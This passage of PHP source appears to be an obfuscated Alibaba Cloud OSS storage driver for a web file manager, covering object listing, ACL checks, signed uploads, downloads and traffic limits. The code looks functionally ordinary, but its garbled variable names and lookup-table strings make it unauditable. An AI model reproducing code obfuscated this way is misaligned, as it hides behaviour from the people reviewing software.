$ªõ§«Ò[$¢‹»¿Ù[85]][] = $Îó‹òÁº; } $Ó¡†šƒø = $this->delByBatch($ªõ§«Ò[$¢‹»¿Ù[86]]); if (!$Ó¡†šƒø) { return !1; } $Ó¡†šƒø = $this->delByBatch($ªõ§«Ò[$¢‹»¿Ù[85]]); if (!$Ó¡†šƒø) { return !1; } return $this->delFile($Îó‹òÁº); } private function delByBatch($×¡ÜÛ“) { foreach (array_chunk($×¡ÜÛ“, 1000) as $Áï˜é–ï) { try { $this->client->deleteObjects($this->bucket, $Áï˜é–ï); } catch (OSS\Core\OssException $ü’Á“Æ„) { $this->writeLog(__FUNCTION__ . $_SERVER[÷åé¼î][214] . $ü’Á“Æ„->getMessage()); return !1; } } return !0; } public function rename($ÓÖêºÍÕ, $‰­„šÍ¶) { return $this->renameObject($ÓÖêºÍÕ, $‰­„šÍ¶); } private function fileInfo($ÁŠ¸ßÜ, $×ï÷¬êò = false, $­àâ±Ö = array()) { $°İæ·Ä =& $_SERVER[÷åé¼î]; $Ó”ÇÌŒ = array($°İæ·Ä[32] => $this->pathThis($ÁŠ¸ßÜ), $°İæ·Ä[87] => $this->getPathOuter($ÁŠ¸ßÜ), $°İæ·Ä[33] => $°İæ·Ä[230], $°İæ·Ä[79] => isset($­àâ±Ö[$°İæ·Ä[79]]) ? $­àâ±Ö[$°İæ·Ä[79]] : 0, $°İæ·Ä[169] => $this->ext($ÁŠ¸ßÜ)); if ($×ï÷¬êò) { return $Ó”ÇÌŒ; } $Ó”ÇÌŒ[$°İæ·Ä[231]] = $Ó”ÇÌŒ[$°İæ·Ä[88]] = 0; $Ó”ÇÌŒ[$°İæ·Ä[232]] = $Ó”ÇÌŒ[$°İæ·Ä[233]] = !0; if (empty($­àâ±Ö)) { $ğêğ±±© = $this->objectMeta($ÁŠ¸ßÜ); if (!$ğêğ±±©) { return $Ó”ÇÌŒ; } $­àâ±Ö = array($°İæ·Ä[88] => strtotime($ğêğ±±©[$°İæ·Ä[1475]]), $°İæ·Ä[79] => $ğêğ±±©[$°İæ·Ä[1474]] + 0, $°İæ·Ä[1473] => $ğêğ±±©[$°İæ·Ä[1473]]); } if (isset($­àâ±Ö[$°İæ·Ä[1473]]) && $­àâ±Ö[$°İæ·Ä[1473]]) { $Ó”ÇÌŒ[$°İæ·Ä[235]] = trim($­àâ±Ö[$°İæ·Ä[1473]], $°İæ·Ä[121]); } if (isset($­àâ±Ö[$°İæ·Ä[79]])) { $Ó”ÇÌŒ[$°İæ·Ä[79]] = $­àâ±Ö[$°İæ·Ä[79]]; } if (isset($­àâ±Ö[$°İæ·Ä[88]])) { $Ó”ÇÌŒ[$°İæ·Ä[88]] = $­àâ±Ö[$°İæ·Ä[88]]; } if (isset($­àâ±Ö[$°İæ·Ä[206]]) && !trim($Ó”ÇÌŒ[$°İæ·Ä[88]])) { $Ó”ÇÌŒ[$°İæ·Ä[88]] = $­àâ±Ö[$°İæ·Ä[206]]; } return $Ó”ÇÌŒ; } private function folderInfo($”Ç×™©¾, $éâº„øï = false, $á¯ª‹¸“ = array()) { $õøØÓ°¦ =& $_SERVER[÷åé¼î]; $Ö°¶ñô² = array($õøØÓ°¦[32] => $this->pathThis($”Ç×™©¾), $õøØÓ°¦[87] => $this->getPathOuter($õøØÓ°¦[8] . $”Ç×™©¾), $õøØÓ°¦[33] => $õøØÓ°¦[78]); if ($éâº„øï) { return $Ö°¶ñô²; } $Ö°¶ñô²[$õøØÓ°¦[231]] = $Ö°¶ñô²[$õøØÓ°¦[88]] = 0; $Ö°¶ñô²[$õøØÓ°¦[232]] = $Ö°¶ñô²[$õøØÓ°¦[233]] = !0; if (empty($á¯ª‹¸“)) { $”Ç×™©¾ = rtrim($”Ç×™©¾, $õøØÓ°¦[8]) . $õøØÓ°¦[8]; $ïû§Ä”â = $this->objectMeta($”Ç×™©¾); if (!$ïû§Ä”â) { return $Ö°¶ñô²; } $á¯ª‹¸“ = array($õøØÓ°¦[231] => $ïû§Ä”â[$õøØÓ°¦[559]][$õøØÓ°¦[1480]], $õøØÓ°¦[88] => strtotime($ïû§Ä”â[$õøØÓ°¦[1475]])); } if (isset($á¯ª‹¸“[$õøØÓ°¦[88]])) { $Ö°¶ñô²[$õøØÓ°¦[88]] = $á¯ª‹¸“[$õøØÓ°¦[88]]; } if (isset($á¯ª‹¸“[$õøØÓ°¦[231]])) { $Ö°¶ñô²[$õøØÓ°¦[231]] = $á¯ª‹¸“[$õøØÓ°¦[231]]; } return $Ö°¶ñô²; } public function listPath($×ÀËèÚ·, $–Ş€ÙŞ® = false) { $¥ş«á÷¹ =& $_SERVER[÷åé¼î]; $ÎÍÓ±ĞŒ = $this->fileList($×ÀËèÚ·, $¥ş«á÷¹[8], !0); foreach ($ÎÍÓ±ĞŒ[$¥ş«á÷¹[85]] as $°®•ˆ­– => $ËÔš°§İ) { $ÎÍÓ±ĞŒ[$¥ş«á÷¹[85]][$°®•ˆ­–] = $this->folderInfo($ËÔš°§İ, $–Ş€ÙŞ®, $ËÔš°§İ); } foreach ($ÎÍÓ±ĞŒ[$¥ş«á÷¹[86]] as $°®•ˆ­– => $ËÔš°§İ) { $ÎÍÓ±ĞŒ[$¥ş«á÷¹[86]][$°®•ˆ­–] = $this->fileInfo($ËÔš°§İ[$¥ş«á÷¹[32]], $–Ş€ÙŞ®, $ËÔš°§İ); } return $ÎÍÓ±ĞŒ; } protected function infoChildren($Æ’”Æ¬í, &$Û”¹ûƒÓ) { $£’»£· =& $_SERVER[÷åé¼î]; $ÅÒÕô´‰ = $this->fileList($Æ’”Æ¬í, $£’»£·[12], !0); $Û”¹ûƒÓ[$£’»£·[81]] += count($ÅÒÕô´‰[$£’»£·[85]]); $Û”¹ûƒÓ[$£’»£·[80]] += count($ÅÒÕô´‰[$£’»£·[86]]); foreach ($ÅÒÕô´‰[$£’»£·[86]] as $ä­ö«ìş) { if (!$ä­ö«ìş || !$ä­ö«ìş[$£’»£·[79]]) { continue; } $Û”¹ûƒÓ[$£’»£·[79]] += $ä­ö«ìş[$£’»£·[79]]; } } public function has($–ñ«ìñ, $è¦…áóş = false, $¶¤¡Ú¡ = true) { $©×á÷ßÑ =& $_SERVER[÷åé¼î]; $–ñ«ìñ = trim($–ñ«ìñ, $©×á÷ßÑ[8]); $á”Ë²ôş = empty($–ñ«ìñ) && $–ñ«ìñ !== $©×á÷ßÑ[228] ? $©×á÷ßÑ[12] : $–ñ«ìñ . $©×á÷ßÑ[8]; $æÜ†á„¡ = $©×á÷ßÑ[12]; $‚Şí½Ç‹ = 500; $»ö‘÷êë = $û­²è¶Ş = 0; while (!0) { check_abort(); $úˆ˜¡‡ß = array($©×á÷ßÑ[1469] => $©×á÷ßÑ[8], $©×á÷ßÑ[1470] => $á”Ë²ôş, $©×á÷ßÑ[1471] => $‚Şí½Ç‹, $©×á÷ßÑ[1472] => $æÜ†á„¡); try { $İäİ’âò = $this->client->listObjects($this->bucket, $úˆ˜¡‡ß); } catch (OSS\Core\OssException $‘€…şË ) { $this->writeLog(__FUNCTION__ . $©×á÷ßÑ[214] . $‘€…şË ->getMessage()); break; } $æÜ†á„¡ = $İäİ’âò->getNextMarker(); $ƒ±Öø‹¥ = $İäİ’âò->getObjectList(); $Ìô‡çıÑ = $İäİ’âò->getPrefixList(); if ($è¦…áóş) { if (count($ƒ±Öø‹¥) > 1 || count($ƒ±Öø‹¥) == 1 && $ƒ±Öø‹¥[0]->getKey() != $á”Ë²ôş) { $»ö‘÷êë += count($ƒ±Öø‹¥) - 1; } if (!empty($Ìô‡çıÑ)) { $û­²è¶Ş += count($Ìô‡çıÑ); } if ($æÜ†á„¡ === $©×á÷ßÑ[12]) { break; } continue; } if ($¶¤¡Ú¡) { if (!empty($ƒ±Öø‹¥)) { if (count($ƒ±Öø‹¥) > 1 || $ƒ±Öø‹¥[0]->getKey() != $á”Ë²ôş) { return !0; } } } else { if (!empty($Ìô‡çıÑ)) { return !0; } } if ($æÜ†á„¡ === $©×á÷ßÑ[12]) { break; } } if ($è¦…áóş) { return array($©×á÷ßÑ[239] => $»ö‘÷êë, $©×á÷ßÑ[240] => $û­²è¶Ş); } return !1; } public function listAll($·ß¾™¯û) { $Ç§ÄòÙ› =& $_SERVER[÷åé¼î]; $÷ûù³¾† = $this->fileList($·ß¾™¯û, $Ç§ÄòÙ›[12], !0); $¿òûäæ = array_to_keyvalue($÷ûù³¾†[$Ç§ÄòÙ›[86]], $Ç§ÄòÙ›[32]); foreach ($÷ûù³¾†[$Ç§ÄòÙ›[85]] as $§÷üŠŞ‚) { if (is_string($§÷üŠŞ‚)) { $¿òûäæ[$§÷üŠŞ‚] = array($Ç§ÄòÙ›[79] => 0); } } return $this->listAllFiles($·ß¾™¯û, $¿òûäæ); } public function canRead($»†ĞÙá) { $±¹ê³åø =& $_SERVER[÷åé¼î]; $§†ıÌİ  = $this->pathAcl($»†ĞÙá); return $§†ıÌİ  == $±¹ê³åø[1481] || $§†ıÌİ  == $±¹ê³åø[603] ? !0 : !1; } public function canWrite($ÚÕ›ÓÂÊ) { $Œû––şÌ = $this->pathAcl($ÚÕ›ÓÂÊ); return $Œû––şÌ == $_SERVER[÷åé¼î][603] ? !0 : !1; } public function pathAcl($¸õêï´ñ) { $‡ÑÑ³İÒ =& $_SERVER[÷åé¼î]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ÍëšÑ´ë = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¸õêï´ñ)); } catch (OSS\Core\OssException $Ë€˜¸ı) { $this->writeLog(__FUNCTION__ . $‡ÑÑ³İÒ[214] . $Ë€˜¸ı->getMessage()); return !1; } $ÛûÂÁ¯ = $ÍëšÑ´ë == $‡ÑÑ³İÒ[37] ? $this->bucketAcl : $ÍëšÑ´ë; if ($ÛûÂÁ¯ == $‡ÑÑ³İÒ[1482]) { return $‡ÑÑ³İÒ[1481]; } if ($ÛûÂÁ¯ == $‡ÑÑ³İÒ[1483]) { return $‡ÑÑ³İÒ[603]; } return $ÛûÂÁ¯; } private function chmodPath($–ï·ã÷Ÿ, $œÉ«¢‰Ú = '') { $¨°¬šÖë =& $_SERVER[÷åé¼î]; $™Å¯Á»³ = empty($œÉ«¢‰Ú) ? $¨°¬šÖë[1483] : $œÉ«¢‰Ú; $¦ŞÅ…¢“ = array($¨°¬šÖë[37], $¨°¬šÖë[229], $¨°¬šÖë[1482], $¨°¬šÖë[1483]); if (!in_array($™Å¯Á»³, $¦ŞÅ…¢“)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($–ï·ã÷Ÿ), $™Å¯Á»³); } catch (OSS\Core\OssException $…÷Ôé»á) { $this->writeLog(__FUNCTION__ . $¨°¬šÖë[214] . $…÷Ôé»á->getMessage()); return !1; } return !0; } public function getContent($‡ÈÎˆÃõ) { return $this->fileSubstr($‡ÈÎˆÃõ, -1); } public function setContent($Éàñî¦˜, $Ï³”§ú¶ = '') { $Ë²êÁì¾ =& $_SERVER[÷åé¼î]; try { $÷¹åï¦À = $this->trafficLimit($Ë²êÁì¾[1484]); $å¸¨ÄÏ = $this->client->putObject($this->bucket, $this->pathEncode($Éàñî¦˜), $Ï³”§ú¶, $÷¹åï¦À); } catch (OSS\Core\OssException $¡£²éÁ) { $this->writeLog(__FUNCTION__ . $Ë²êÁì¾[214] . $¡£²éÁ->getMessage()); return !1; } $ üøè×¨ = array($Ë²êÁì¾[1476] => trim($å¸¨ÄÏ[$Ë²êÁì¾[1473]], $Ë²êÁì¾[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Éàñî¦˜))); $this->updateObjMeta($Éàñî¦˜, $ üøè×¨); return isset($å¸¨ÄÏ[$Ë²êÁì¾[1485]][$Ë²êÁì¾[292]]) ? !0 : !1; } private function updateObjMeta($˜ªÓšÒİ, $øø¯’—„) { $˜ªÓšÒİ = $this->pathEncode($˜ªÓšÒİ); try { $’‡­˜ÓÓ = array(OSS\OssClient::OSS_HEADERS => $øø¯’—„); $this->client->copyObject($this->bucket, $˜ªÓšÒİ, $this->bucket, $˜ªÓšÒİ, $’‡­˜ÓÓ); } catch (OSS\Core\OssException $æ¯ÅÉ‰§) { $this->writeLog(__FUNCTION__ . $_SERVER[÷åé¼î][214] . $æ¯ÅÉ‰§->getMessage()); return !1; } return !0; } public function upload($şß²û³î, $±£»º œ, $áÈˆ«Ş× = false, $¦àŸ = REPEAT_REPLACE) { $öŞÎ‚Ñá =& $_SERVER[÷åé¼î]; $Á´ğ…ã¶ = trim($şß²û³î, $öŞÎ‚Ñá[8]); $Ù¶ùÂ¶ò = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($öŞÎ‚Ñá[1476] => @md5_file($±£»º œ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($şß²û³î))); $Ù¶ùÂ¶ò = $this->trafficLimit($öŞÎ‚Ñá[1484], $Ù¶ùÂ¶ò); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Á´ğ…ã¶), $±£»º œ, $Ù¶ùÂ¶ò); } catch (OSS\Core\OssException $¢„§Ğ) { $this->writeLog(__FUNCTION__ . $öŞÎ‚Ñá[214] . $¢„§Ğ->getMessage()); return !1; } return $this->getPathOuter($şß²û³î); } public function getHost() { $ô„ûÀ˜ò =& $_SERVER[÷åé¼î]; $…‡´Ö¥Ô = explode($ô„ûÀ˜ò[210], parent::getHost()); return $…‡´Ö¥Ô[0] . $ô„ûÀ˜ò[210] . $this->bucket . $ô„ûÀ˜ò[10] . $…‡´Ö¥Ô[1]; } public function uploadFormData($¸Õ÷ø«, $–öÅ±Êù = 3600) { $Š½Èû½ =& $_SERVER[÷åé¼î]; if (!($ ¹ı¹¯— = $this->getHost())) { return !1; } $¨é¿ˆÀá = $–öÅ±Êù; $öˆè¿Ôš = date($Š½Èû½[1486], time() + $¨é¿ˆÀá); $ËÑ¬å½¡ = new DateTime($öˆè¿Ôš); $“ºÈŠø = $ËÑ¬å½¡->format(DateTime::ISO8601); $òå¿š¢ = strpos($“ºÈŠø, $Š½Èû½[356]); $“ºÈŠø = substr($“ºÈŠø, 0, $òå¿š¢) . $Š½Èû½[1487]; $È¼­öÍ• = 1048576000 * 5; $ÃË¨²¢ = $this->pathFather($¸Õ÷ø«); $ª Ãø‡¸ = array($Š½Èû½[275] => $“ºÈŠø, $Š½Èû½[278] => array(array($Š½Èû½[1488], 0, $È¼­öÍ•), array($Š½Èû½[281], $Š½Èû½[282], $ÃË¨²¢))); $Ç¥˜ÓÏÙ = base64_encode(json_encode($ª Ãø‡¸)); $Ñ¸ğú¢Â = base64_encode(hash_hmac($Š½Èû½[263], $Ç¥˜ÓÏÙ, $this->secret, !0)); $ÜÏê†Š = array($Š½Èû½[293] => $Ç¥˜ÓÏÙ, $Š½Èû½[1489] => $this->accessKey, $Š½Èû½[285] => $Š½Èû½[274], $Š½Èû½[1490] => $Ñ¸ğú¢Â, $Š½Èû½[208] => $ ¹ı¹¯—); $ÜÏê†Š = $this->trafficLimit($Š½Èû½[1484], $ÜÏê†Š); return $ÜÏê†Š; } public function multiUploadFormData($ÒşçÃ£§, $ªÕµÄ½ì = 3600) { $Óñ¯ËÔ· =& $_SERVER[÷åé¼î]; if (!($ŒÜñ¿ÓÍ = $this->getHost())) { return !1; } $ïÔÓê®İ = $this->trafficLimit($Óñ¯ËÔ·[1484]); $·°ÂØ²¼ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÒşçÃ£§), $ïÔÓê®İ); return array($Óñ¯ËÔ·[254] => $·°ÂØ²¼, $Óñ¯ËÔ·[208] => $ŒÜñ¿ÓÍ . $Óñ¯ËÔ·[8] . $this->pathEncode($ÒşçÃ£§), $Óñ¯ËÔ·[255] => gmdate($Óñ¯ËÔ·[1491]), $Óñ¯ËÔ·[97] => $ÒşçÃ£§); } public function multiUploadAuthData($¡¿íØ¸, $ùµœÎÁÎ = array()) { $è•ˆ£ ” =& $_SERVER[÷åé¼î]; $éÍìÙµü = isset($ùµœÎÁÎ[$è•ˆ£ ”[255]]) ? $ùµœÎÁÎ[$è•ˆ£ ”[255]] : gmdate($è•ˆ£ ”[1491]); $û‡‰³ä = isset($ùµœÎÁÎ[$è•ˆ£ ”[169]]) ? $ùµœÎÁÎ[$è•ˆ£ ”[169]] : $è•ˆ£ ”[12]; $•¢®öÌâ = $¡¿íØ¸; if (isset($ùµœÎÁÎ[$è•ˆ£ ”[97]])) { $•¢®öÌâ = $ùµœÎÁÎ[$è•ˆ£ ”[97]]; unset($ùµœÎÁÎ[$è•ˆ£ ”[97]]); } if (isset($ùµœÎÁÎ[$è•ˆ£ ”[256]])) { $ùµœÎÁÎ[$è•ˆ£ ”[255]] = $éÍìÙµü; return $this->listUploadParts($•¢®öÌâ, $ùµœÎÁÎ); } $Çæ¢Ôµ© = array($è•ˆ£ ”[257], $è•ˆ£ ”[12], $è•ˆ£ ”[123], $éÍìÙµü, "\x78\x2d\x6f\x73\163\55\144\141\x74\145\x3a{$éÍìÙµü}", $è•ˆ£ ”[8] . $this->bucket . $è•ˆ£ ”[8] . $•¢®öÌâ . $û‡‰³ä); if (strpos($û‡‰³ä, $è•ˆ£ ”[258]) === 0) { $Çæ¢Ôµ©[0] = $è•ˆ£ ”[259]; if ($µ“ã¾ = $this->trafficLimit($è•ˆ£ ”[1484])) { $•¢®öÌâ = $è•ˆ£ ”[1492]; array_splice($Çæ¢Ôµ©, 5, 0, $•¢®öÌâ . $è•ˆ£ ”[4] . $µ“ã¾[$•¢®öÌâ]); } } if (isset($ùµœÎÁÎ[$è•ˆ£ ”[260]]) && $ùµœÎÁÎ[$è•ˆ£ ”[260]] == $è•ˆ£ ”[261]) { $Çæ¢Ôµ©[0] = $è•ˆ£ ”[261]; } if (!empty($ùµœÎÁÎ[$è•ˆ£ ”[1493]])) { $ÇÛ±ÄÆİ = array_merge(array($Çæ¢Ôµ©[4]), $ùµœÎÁÎ[$è•ˆ£ ”[1493]]); sort($ÇÛ±ÄÆİ); $Çæ¢Ôµ©[4] = implode($è•ˆ£ ”[262], $ÇÛ±ÄÆİ); } $÷ÚŒ†×Ù = implode($è•ˆ£ ”[262], $Çæ¢Ôµ©); $áÍ‘·å¡ = base64_encode(hash_hmac($è•ˆ£ ”[263], $÷ÚŒ†×Ù, $this->secret, !0)); $ø¬Úîóø = $è•ˆ£ ”[1459] . $this->accessKey . $è•ˆ£ ”[4] . $áÍ‘·å¡; if (strpos($û‡‰³ä, $è•ˆ£ ”[258]) === 0) { $ø¬Úîóø = array($è•ˆ£ ”[265] => $ø¬Úîóø, $è•ˆ£ ”[255] => $éÍìÙµü); if ($µ“ã¾) { $ø¬Úîóø = array_merge($ø¬Úîóø, $µ“ã¾); } } return $ø¬Úîóø; } public function listUploadParts($¶äÇÒ´‚, $—†ËŠ•) { $‰äî÷ø· =& $_SERVER[÷åé¼î]; $”‡Ÿ³Õ = parse_url_query($—†ËŠ•[$‰äî÷ø·[169]]); $İ¤°ÈÀ = $this->client->listParts($this->bucket, $this->pathEncode($¶äÇÒ´‚), $”‡Ÿ³Õ[$‰äî÷ø·[254]]); $Û«ôï­ = $İ¤°ÈÀ->getListPart(); $‹¿¸Ä¡‰ = array(); foreach ($Û«ôï­ as $Î©ŞÏó) { $‹¿¸Ä¡‰[] = array($‰äî÷ø·[1478] => $Î©ŞÏó->getPartNumber(), $‰äî÷ø·[1479] => trim($Î©ŞÏó->getETag(), $‰äî÷ø·[121])); } unset($—†ËŠ•[$‰äî÷ø·[256]], $—†ËŠ•[$‰äî÷ø·[260]]); $ÅšìüÆï = $this->multiUploadAuthData($¶äÇÒ´‚, $—†ËŠ•); if (empty($ÅšìüÆï)) { return !1; } return array($‰äî÷ø·[265] => $ÅšìüÆï, $‰äî÷ø·[255] => $—†ËŠ•[$‰äî÷ø·[255]], $‰äî÷ø·[267] => $‹¿¸Ä¡‰); } public function download($ÛÙñô°™, $õëÅÀùÉ) { $æ‚¶èÕ =& $_SERVER[÷åé¼î]; if ($this->isFolder($ÛÙñô°™)) { return !1; } try { $ÚÀßãö¿ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $õëÅÀùÉ); $ÚÀßãö¿ = $this->trafficLimit($æ‚¶èÕ[112], $ÚÀßãö¿); $this->client->getObject($this->bucket, $this->pathEncode($ÛÙñô°™), $ÚÀßãö¿); } catch (OSS\Core\OssException $ÙÕâ˜¼) { $this->writeLog(__FUNCTION__ . $æ‚¶èÕ[214] . $ÙÕâ˜¼->getMessage()); return !1; } return $õëÅÀùÉ; } public function fileSubstr($¤åÖ ®Õ, $ùùÚÚ¿å = 0, $¯ÂâÁš× = false) { if ($ùùÚÚ¿å === -1) { $Ì§ÈøÎ = array(); } else { if ($¯ÂâÁš× === !1) { $ò•¸Ğò‰ = $this->size($¤åÖ ®Õ); } else { $ò•¸Ğò‰ = $ùùÚÚ¿å + $¯ÂâÁš× - 1; } $Ì§ÈøÎ = array(OSS\OssClient::OSS_RANGE => "{$ùùÚÚ¿å}\55{$ò•¸Ğò‰}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($¤åÖ ®Õ), $Ì§ÈøÎ); } catch (OSS\Core\OssException $§¯à¬ÛŸ) { $this->writeLog(__FUNCTION__ . $_SERVER[÷åé¼î][214] . $§¯à¬ÛŸ->getMessage()); think_exception($§¯à¬ÛŸ->getMessage()); return !1; } } private function trafficLimit($×à¿ë¥, $íÁ—ÄŸğ = array()) { $Æ¹’Ãšİ =& $_SERVER[÷åé¼î]; if ($×à¿ë¥ == $Æ¹’Ãšİ[1484] && $this->isUploadServer() || $×à¿ë¥ == $Æ¹’Ãšİ[112] && $this->isFileOutServer()) { return $íÁ—ÄŸğ; } $Â‚¤€¹¸ = floatval($GLOBALS[$Æ¹’Ãšİ[6]][$Æ¹’Ãšİ[92]][$Æ¹’Ãšİ[110]][$×à¿ë¥]) * 1024 * 1024 * 8; if (!$Â‚¤€¹¸) { return $íÁ—ÄŸğ; } $Â‚¤€¹¸ = $Â‚¤€¹¸ < 819200 ? 819200 : ($Â‚¤€¹¸ > 838860800 ? 838860800 : $Â‚¤€¹¸); $íÁ—ÄŸğ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Â‚¤€¹¸); return $íÁ—ÄŸğ; } public function link($‚î»Ñ, $ƒ²‹åŸÍ = array()) { $ëåõ‘š€ =& $_SERVER[÷åé¼î]; if (!$this->exist($‚î»Ñ) || $this->isFolder($‚î»Ñ)) { return !1; } try { $ƒ²‹åŸÍ = $this->trafficLimit($ëåõ‘š€[112], $ƒ²‹åŸÍ); $íÚÁÌ‘ş = $this->client->signUrl($this->bucket, $this->pathEncode($‚î»Ñ), 3600 * 12, $ëåõ‘š€[261], $ƒ²‹åŸÍ); return $this->getCdnLink($íÚÁÌ‘ş); } catch (OSS\Core\OssException $¼ì±ÙŠà) { $this->writeLog(__FUNCTION__ . $ëåõ‘š€[214] . $¼ì±ÙŠà->getMessage()); return !1; } } public function fileOut($ŸëÙ£¤, $»ûÉ¼æ± = false, $÷•Íñ = false, $­Éç—›› = '') { $°ö‚´ûÌ =& $_SERVER[÷åé¼î]; if ($this->isFileOutServer()) { return $this->fileOutServer($ŸëÙ£¤, $»ûÉ¼æ±, $÷•Íñ, $­Éç—››); } if (!$÷•Íñ) { $÷•Íñ = $this->pathThis($ŸëÙ£¤); } $÷•Íñ = rawurlencode($÷•Íñ); $¡Àüî®¨ = get_file_mime(get_path_ext($÷•Íñ)); if ($¡Àüî®¨ == $°ö‚´ûÌ[248]) { return parent::fileOut($ŸëÙ£¤, $»ûÉ¼æ±, $÷•Íñ, $­Éç—››); } $»ûÉ¼æ± = $»ûÉ¼æ± ? $°ö‚´ûÌ[1494] : $°ö‚´ûÌ[1495]; $’¿Ã¸ = array(OSS\OssClient::OSS_SUB_RESOURCE => $°ö‚´ûÌ[1496] . rawurlencode("{$»ûÉ¼æ±}\73\146\x69\x6c\145\156\x61\x6d\x65\75{$÷•Íñ}")); $’¿Ã¸[OSS\OssClient::OSS_SUB_RESOURCE] .= $°ö‚´ûÌ[1497] . rawurlencode($¡Àüî®¨); $“²ÖµÏ = $this->link($ŸëÙ£¤, $’¿Ã¸); $this->fileOutLink($“²ÖµÏ); } public function fileOutServer($§üÏõÊ•, $á¶¾ôÃÀ = false, $Í£íæë = false, $´Ç¼îÌ‰ = '') { parent::fileOut($§üÏõÊ•, $á¶¾ôÃÀ, $Í£íæë, $´Ç¼îÌ‰); } public function fileOutImage($¤ÅÑ¤Š“, $ıÙÅ¬£ = 250) { if ($this->size($¤ÅÑ¤Š“) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¤ÅÑ¤Š“, $ıÙÅ¬£); } $’¾µ»şç = array(OSS\OssClient::OSS_PROCESS => $_SERVER[÷åé¼î][1456] . $ıÙÅ¬£); $‘†Ö±ë¬ = $this->link($¤ÅÑ¤Š“, $’¾µ»şç); $this->fileOutLink($‘†Ö±ë¬); } public function fileOutImageServer($ÂÕ¶ßü—, $À±›»¸ = 250) { parent::fileOutImage($ÂÕ¶ßü—, $À±›»¸); } public function fileOutLink($æ€Í»Ñö) { $á‘ÍÛ×‹ =& $_SERVER[÷åé¼î]; if (!$this->isCdnHost() && substr($æ€Í»Ñö, 0, 7) == $á‘ÍÛ×‹[1404]) { $æ€Í»Ñö = $á‘ÍÛ×‹[1405] . substr($æ€Í»Ñö, 7); } header($á‘ÍÛ×‹[175] . $æ€Í»Ñö); die; } public function hashMd5($•ĞÍ—‰Ö, $éÂšñ€Â = '') { $¹†ÚñÒ£ =& $_SERVER[÷åé¼î]; $‡µïØå = $this->_objectMeta($•ĞÍ—‰Ö); if (!$‡µïØå) { return $¹†ÚñÒ£[12]; } if (!isset($‡µïØå[$¹†ÚñÒ£[1476]]) && !empty($éÂšñ€Â)) { $×±æ’øï = $this->updateObjMeta($•ĞÍ—‰Ö, array($¹†ÚñÒ£[1476] => $éÂšñ€Â)); $‡µïØå[$¹†ÚñÒ£[1476]] = $×±æ’øï ? $éÂšñ€Â : $¹†ÚñÒ£[12]; } return isset($‡µïØå[$¹†ÚñÒ£[1476]]) ? strtolower($‡µïØå[$¹†ÚñÒ£[1476]]) : $¹†ÚñÒ£[12]; } public function size($ÅŞî¹ÑÉ) { $©„Ë¨Ğ = $this->objectMeta($ÅŞî¹ÑÉ); return $©„Ë¨Ğ ? $©„Ë¨Ğ[$_SERVER[÷åé¼î][79]] : 0; } public function info($“òÒ»øÕ) { if ($this->isFolder($“òÒ»øÕ)) { return $this->folderInfo($“òÒ»øÕ); } else { if ($this->isFile($“òÒ»øÕ)) { return $this->fileInfo($“òÒ»øÕ); } } return !1; } public function exist($õ«‡šÔÁ) { return $this->isFile($õ«‡šÔÁ) || $this->isFolder($õ«‡šÔÁ); } public function isFile($³À–¦‹Ğ) { return !$this->isFolder($³À–¦‹Ğ) && $this->objectMeta($³À–¦‹Ğ); } public function isFolder($‘ÙƒåƒÁ) { return $this->cacheMethod($_SERVER[÷åé¼î][179], $‘ÙƒåƒÁ); } protected function objectMeta($àŠÑ‰„ß) { return $this->cacheMethod($_SERVER[÷åé¼î][181], $àŠÑ‰„ß); } protected function _objectMeta($úş¨çë°) { $»ÀãÈœö =& $_SERVER[÷åé¼î]; try { $ŞÚƒàÕÍ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($úş¨çë°)); } catch (OSS\Core\OssException $Æê«Šé ) { $this->writeLog(__FUNCTION__ . $»ÀãÈœö[214] . $Æê«Šé ->getMessage()); $ŞÚƒàÕÍ = !1; } if ($ŞÚƒàÕÍ) { $ŞÚƒàÕÍ[$»ÀãÈœö[79]] = intval($ŞÚƒàÕÍ[$»ÀãÈœö[1474]]); } return $ŞÚƒàÕÍ; } protected function _isFolder($´Á¨ÛÈ) { $‚ÒÅÜÉ‹ =& $_SERVER[÷åé¼î]; if ($´Á¨ÛÈ == $‚ÒÅÜÉ‹[12] || $´Á¨ÛÈ == $‚ÒÅÜÉ‹[8]) { return !0; } $ºÚºİ = array($‚ÒÅÜÉ‹[1469] => $‚ÒÅÜÉ‹[8], $‚ÒÅÜÉ‹[1470] => rtrim($´Á¨ÛÈ, $‚ÒÅÜÉ‹[8]) . $‚ÒÅÜÉ‹[8], $‚ÒÅÜÉ‹[1471] => 1, $‚ÒÅÜÉ‹[1472] => $‚ÒÅÜÉ‹[12]); $ÁË¾ˆ†Š = $this->client->listObjects($this->bucket, $ºÚºİ); if ($ÁË¾ˆ†Š->getObjectList() || $ÁË¾ˆ†Š->getPrefixList()) { return !0; } return !1; } public function writeLog($Û…¡Ñµ = '', $²½ŒØå = false) { $„ÎÒÑ¸‡ =& $_SERVER[÷åé¼î]; $ôòÑ½·ç = in_array(ACTION, array($„ÎÒÑ¸‡[212], $„ÎÒÑ¸‡[213])); if (!$ôòÑ½·ç && !GLOBAL_DEBUG) { return; } $áõé‚¸® = 0; if (stripos($Û…¡Ñµ, $„ÎÒÑ¸‡[1498]) !== !1) { $áõé‚¸® = 1; $¹Ãç•ñÕ = explode($„ÎÒÑ¸‡[1499], $Û…¡Ñµ); $Û…¡Ñµ = !empty($¹Ãç•ñÕ[1]) ? $¹Ãç•ñÕ[1] : $Û…¡Ñµ; } else { if (stripos($Û…¡Ñµ, $„ÎÒÑ¸‡[1500])) { $áõé‚¸® = 2; $¹Ãç•ñÕ = explode($„ÎÒÑ¸‡[1500], $Û…¡Ñµ); $¹Ãç•ñÕ = explode($„ÎÒÑ¸‡[4], $¹Ãç•ñÕ[0]); $Û…¡Ñµ = 